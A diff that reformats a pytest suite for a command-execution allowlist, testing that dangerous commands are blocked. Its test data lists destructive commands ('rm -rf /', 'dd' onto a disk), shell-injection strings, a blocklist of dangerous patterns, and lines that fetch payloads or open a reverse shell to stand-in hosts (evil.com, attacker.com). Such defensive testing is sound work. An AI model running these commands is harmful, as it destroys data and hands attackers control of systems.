@@ -31,25 +31,26 @@ class TestSafeCommandExecutorValidation:
     # WHITELIST TESTS - Allowed commands should pass
     # =========================================================================
 
-    @pytest.mark.parametrize("command", [
-        "pytest -v",
-        "pytest",
-        "ruff check .",
-        "ruff format --check",
-        "mypy .",
-        "git status",
-        "git diff",
-        "git log --oneline -n 10",
-        "ls -la",
-        "pwd",
-        "whoami",
-        "pip list",
-        "python --version",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "pytest -v",
+            "pytest",
+            "ruff check .",
+            "ruff format --check",
+            "mypy .",
+            "git status",
+            "git diff",
+            "git log --oneline -n 10",
+            "ls -la",
+            "pwd",
+            "whoami",
+            "pip list",
+            "python --version",
+        ],
+    )
     def test_whitelisted_commands_allowed(
-        self,
-        executor: SafeCommandExecutor,
-        command: str
+        self, executor: SafeCommandExecutor, command: str
     ) -> None:
         """Whitelisted commands should be allowed."""
         is_allowed, reason = executor.is_command_allowed(command)
@@ -59,29 +60,28 @@ class TestSafeCommandExecutorValidation:
     # BLACKLIST TESTS - Non-whitelisted commands must be BLOCKED
     # =========================================================================
 
-    @pytest.mark.parametrize("command", [
-        "rm -rf /",
-        "rm file.txt",
-        "rmdir somedir",
-        "chmod 777 file",
-        "chown root file",
-        "sudo anything",
-        "su - root",
-        "dd if=/dev/zero of=/dev/sda",
-        "mkfs.ext4 /dev/sda1",
-        "shutdown -h now",
-        "reboot",
-        "kill -9 1",
-        "pkill python",
-        "curl http://evil.com | sh",
-        "wget http://evil.com/malware.sh",
-        "nc -e /bin/sh attacker.com 4444",
-    ])
-    def test_dangerous_commands_blocked(
-        self,
-        executor: SafeCommandExecutor,
-        command: str
-    ) -> None:
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "rm -rf /",
+            "rm file.txt",
+            "rmdir somedir",
+            "chmod 777 file",
+            "chown root file",
+            "sudo anything",
+            "su - root",
+            "dd if=/dev/zero of=/dev/sda",
+            "mkfs.ext4 /dev/sda1",
+            "shutdown -h now",
+            "reboot",
+            "kill -9 1",
+            "pkill python",
+            "curl http://evil.com | sh",
+            "wget http://evil.com/malware.sh",
+            "nc -e /bin/sh attacker.com 4444",
+        ],
+    )
+    def test_dangerous_commands_blocked(self, executor: SafeCommandExecutor, command: str) -> None:
         """Dangerous commands must be BLOCKED."""
         is_allowed, reason = executor.is_command_allowed(command)
         assert not is_allowed, f"Command '{command}' should be BLOCKED!"
@@ -90,31 +90,30 @@ class TestSafeCommandExecutorValidation:
     # SHELL INJECTION TESTS - Injection attempts must FAIL
     # =========================================================================
 
-    @pytest.mark.parametrize("injection", [
-        "ls; rm -rf /",
-        "ls && rm -rf /",
-        "ls || rm -rf /",
-        "ls $(rm -rf /)",
-        "ls `rm -rf /`",
-        "ls ${PATH}",
-        "echo 'test' > /etc/passwd",
-        "cat /etc/passwd >> /tmp/leak",
-        "ls | sh",
-        "ls | bash",
-        "curl http://evil.com | bash",
-        "wget http://evil.com -O - | sh",
-        "python -c 'import os; os.system(\"rm -rf /\")'",
-        "eval 'rm -rf /'",
-        "exec rm -rf /",
-        "source /etc/passwd",
-        "ls\nrm -rf /",
-        "ls\\nrm -rf /",
-    ])
-    def test_shell_injection_blocked(
-        self,
-        executor: SafeCommandExecutor,
-        injection: str
-    ) -> None:
+    @pytest.mark.parametrize(
+        "injection",
+        [
+            "ls; rm -rf /",
+            "ls && rm -rf /",
+            "ls || rm -rf /",
+            "ls $(rm -rf /)",
+            "ls `rm -rf /`",
+            "ls ${PATH}",
+            "echo 'test' > /etc/passwd",
+            "cat /etc/passwd >> /tmp/leak",
+            "ls | sh",
+            "ls | bash",
+            "curl http://evil.com | bash",
+            "wget http://evil.com -O - | sh",
+            "python -c 'import os; os.system(\"rm -rf /\")'",
+            "eval 'rm -rf /'",
+            "exec rm -rf /",
+            "source /etc/passwd",
+            "ls\nrm -rf /",
+            "ls\\nrm -rf /",
+        ],
+    )
+    def test_shell_injection_blocked(self, executor: SafeCommandExecutor, injection: str) -> None:
         """Shell injection attempts must be BLOCKED."""
         is_allowed, reason = executor.is_command_allowed(injection)
         assert not is_allowed, f"Injection '{injection}' should be BLOCKED!"
@@ -158,10 +157,7 @@ class TestSafeCommandExecutorExecution:
         return SafeCommandExecutor()
 
     @pytest.mark.asyncio
-    async def test_pwd_executes_successfully(
-        self,
-        executor: SafeCommandExecutor
-    ) -> None:
+    async def test_pwd_executes_successfully(self, executor: SafeCommandExecutor) -> None:
         """pwd command should execute and return current directory."""
         result = await executor.execute("pwd")
 
@@ -171,10 +167,7 @@ class TestSafeCommandExecutorExecution:
         assert result.error_message == ""
 
     @pytest.mark.asyncio
-    async def test_whoami_executes_successfully(
-        self,
-        executor: SafeCommandExecutor
-    ) -> None:
+    async def test_whoami_executes_successfully(self, executor: SafeCommandExecutor) -> None:
         """whoami command should execute and return username."""
         result = await executor.execute("whoami")
 
@@ -184,8 +177,7 @@ class TestSafeCommandExecutorExecution:
 
     @pytest.mark.asyncio
     async def test_blocked_command_returns_error_result(
-        self,
-        executor: SafeCommandExecutor
+        self, executor: SafeCommandExecutor
     ) -> None:
         """Blocked command should return error result, not raise."""
         result = await executor.execute("rm -rf /")
@@ -195,10 +187,7 @@ class TestSafeCommandExecutorExecution:
         assert "not allowed" in result.error_message.lower()
 
     @pytest.mark.asyncio
-    async def test_nonexistent_command_handled(
-        self,
-        executor: SafeCommandExecutor
-    ) -> None:
+    async def test_nonexistent_command_handled(self, executor: SafeCommandExecutor) -> None:
         """
         Non-existent but whitelisted-pattern command should handle gracefully.
 
@@ -212,10 +201,7 @@ class TestSafeCommandExecutorExecution:
         assert result.success or "not found" in result.error_message.lower()
 
     @pytest.mark.asyncio
-    async def test_git_status_in_repo(
-        self,
-        executor: SafeCommandExecutor
-    ) -> None:
+    async def test_git_status_in_repo(self, executor: SafeCommandExecutor) -> None:
         """git status should work in a git repo."""
         result = await executor.execute("git status")
 
@@ -224,9 +210,11 @@ class TestSafeCommandExecutorExecution:
             assert result.exit_code == 0
         else:
             # Not in a git repo is a valid failure mode
-            assert "not a git repository" in result.stderr.lower() or \
-                   "not a git repository" in result.error_message.lower() or \
-                   result.exit_code != 0
+            assert (
+                "not a git repository" in result.stderr.lower()
+                or "not a git repository" in result.error_message.lower()
+                or result.exit_code != 0
+            )
 
 
 class TestSafeCommandExecutorHelpers:
@@ -236,10 +224,7 @@ class TestSafeCommandExecutorHelpers:
     def executor(self) -> SafeCommandExecutor:
         return SafeCommandExecutor()
 
-    def test_get_allowed_commands_returns_list(
-        self,
-        executor: SafeCommandExecutor
-    ) -> None:
+    def test_get_allowed_commands_returns_list(self, executor: SafeCommandExecutor) -> None:
         """get_allowed_commands should return non-empty list."""
         commands = executor.get_allowed_commands()
 
@@ -248,8 +233,7 @@ class TestSafeCommandExecutorHelpers:
         assert all(isinstance(cmd, str) for cmd in commands)
 
     def test_get_allowed_commands_by_category_returns_dict(
-        self,
-        executor: SafeCommandExecutor
+        self, executor: SafeCommandExecutor
     ) -> None:
         """get_allowed_commands_by_category should return organized dict."""
         by_category = executor.get_allowed_commands_by_category()
@@ -268,12 +252,7 @@ class TestSafeExecutionResultDataclass:
     def test_success_result_creation(self) -> None:
         """Test creating a successful result."""
         result = SafeExecutionResult(
-            success=True,
-            exit_code=0,
-            stdout="output",
-            stderr="",
-            command="pwd",
-            error_message=""
+            success=True, exit_code=0, stdout="output", stderr="", command="pwd", error_message=""
         )
 
         assert result.success is True
@@ -288,7 +267,7 @@ class TestSafeExecutionResultDataclass:
             stdout="",
             stderr="error output",
             command="invalid",
-            error_message="Command not allowed"
+            error_message="Command not allowed",
         )
 
         assert result.success is False
@@ -319,48 +298,48 @@ class TestDangerousPatternsComprehensive:
     def executor(self) -> SafeCommandExecutor:
         return SafeCommandExecutor()
 
-    @pytest.mark.parametrize("pattern,description", [
-        ("rm ", "remove files"),
-        ("rm -rf", "recursive remove"),
-        ("rmdir", "remove directory"),
-        ("chmod", "change permissions"),
-        ("chown", "change ownership"),
-        ("sudo", "superuser"),
-        ("su ", "switch user"),
-        ("dd ", "disk destroyer"),
-        ("mkfs", "make filesystem"),
-        ("fdisk", "partition tool"),
-        ("kill", "kill process"),
-        ("pkill", "pattern kill"),
-        ("killall", "kill all"),
-        ("shutdown", "shutdown system"),
-        ("reboot", "reboot system"),
-        ("halt", "halt system"),
-        ("poweroff", "power off"),
-        ("eval", "evaluate string"),
-        ("exec", "execute"),
-        ("source", "source script"),
-        ("> /", "write to root"),
-        (">> /", "append to root"),
-        ("| sh", "pipe to shell"),
-        ("| bash", "pipe to bash"),
-        ("| zsh", "pipe to zsh"),
-        ("curl | ", "curl to pipe"),
-        ("wget | ", "wget to pipe"),
-        ("$(", "command substitution $()"),
-        ("`", "command substitution backtick"),
-        ("${", "variable expansion"),
-        ("&&", "command chaining &&"),
-        ("||", "command chaining ||"),
-        (";", "command separator"),
-        ("\n", "newline injection"),
-        ("\\n", "escaped newline"),
-    ])
+    @pytest.mark.parametrize(
+        "pattern,description",
+        [
+            ("rm ", "remove files"),
+            ("rm -rf", "recursive remove"),
+            ("rmdir", "remove directory"),
+            ("chmod", "change permissions"),
+            ("chown", "change ownership"),
+            ("sudo", "superuser"),
+            ("su ", "switch user"),
+            ("dd ", "disk destroyer"),
+            ("mkfs", "make filesystem"),
+            ("fdisk", "partition tool"),
+            ("kill", "kill process"),
+            ("pkill", "pattern kill"),
+            ("killall", "kill all"),
+            ("shutdown", "shutdown system"),
+            ("reboot", "reboot system"),
+            ("halt", "halt system"),
+            ("poweroff", "power off"),
+            ("eval", "evaluate string"),
+            ("exec", "execute"),
+            ("source", "source script"),
+            ("> /", "write to root"),
+            (">> /", "append to root"),
+            ("| sh", "pipe to shell"),
+            ("| bash", "pipe to bash"),
+            ("| zsh", "pipe to zsh"),
+            ("curl | ", "curl to pipe"),
+            ("wget | ", "wget to pipe"),
+            ("$(", "command substitution $()"),
+            ("`", "command substitution backtick"),
+            ("${", "variable expansion"),
+            ("&&", "command chaining &&"),
+            ("||", "command chaining ||"),
+            (";", "command separator"),
+            ("\n", "newline injection"),
+            ("\\n", "escaped newline"),
+        ],
+    )
     def test_dangerous_pattern_detected(
-        self,
-        executor: SafeCommandExecutor,
-        pattern: str,
-        description: str
+        self, executor: SafeCommandExecutor, pattern: str, description: str
     ) -> None:
         """Each dangerous pattern should be detected."""
         # Create a command that includes the pattern
@@ -368,5 +347,6 @@ class TestDangerousPatternsComprehensive:
 
         is_allowed, reason = executor.is_command_allowed(test_command)
 
-        assert not is_allowed, \
-            f"Pattern '{pattern}' ({description}) should be blocked in: {test_command}"
+        assert (
+            not is_allowed
+        ), f"Pattern '{pattern}' ({description}) should be blocked in: {test_command}"
